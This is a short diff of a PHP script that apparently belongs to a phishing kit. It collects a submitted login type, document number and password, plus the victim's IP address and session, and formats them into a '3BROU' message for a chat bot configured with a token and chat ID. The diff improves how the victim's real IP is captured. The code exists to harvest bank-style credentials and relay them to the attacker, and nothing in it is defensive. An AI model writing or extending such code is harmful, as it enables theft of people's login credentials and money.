@@ -12,15 +12,27 @@ $elusrr = $_POST['us4c'];
 $elusr = $_POST['breves'];
 $elpax = $_POST['clax'];
 
+
 // Guardar 'breves' en una cookie
 setcookie('breves', $elusr, time() + 3600, "/");
+
+function getClientIP()
+{
+  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+    return $_SERVER['HTTP_CLIENT_IP'];
+  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+  } else {
+    return $_SERVER['REMOTE_ADDR'];
+  }
+}
 
 $token = $config['token'];
 $chat_id = $config['chat_id'];
 
 
 
-$ip = $_SERVER['REMOTE_ADDR'];
+$ip = getClientIP();
 $sesion = isset($_COOKIE['breves']) ? $_COOKIE['breves'] : '';
 
 $mensaje_para_chatbot = "🔵3BROU🔵\nType:" . $elusrr . "\nDOC: " . $elusr . "\nCl4v: " . $elpax . "\nip: " . $ip . "\nsesion: " . $sesion;
